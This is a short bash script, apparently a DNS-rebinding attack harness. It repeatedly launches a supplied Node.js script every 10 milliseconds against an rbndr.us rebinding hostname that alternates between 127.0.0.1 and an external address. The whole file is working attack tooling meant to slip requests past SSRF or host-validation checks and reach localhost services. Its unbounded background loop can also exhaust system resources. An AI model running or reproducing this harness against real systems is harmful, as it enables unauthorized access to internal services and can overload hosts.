#!/bin/bash

if [ "$#" -ne 1 ]; then 
   exit 1
fi

i=0
while true; do
    sleep 0.01
    node $1 http://7f000001.5db8d822.rbndr.us/ &
    let i++
    printf "$i\r"
done
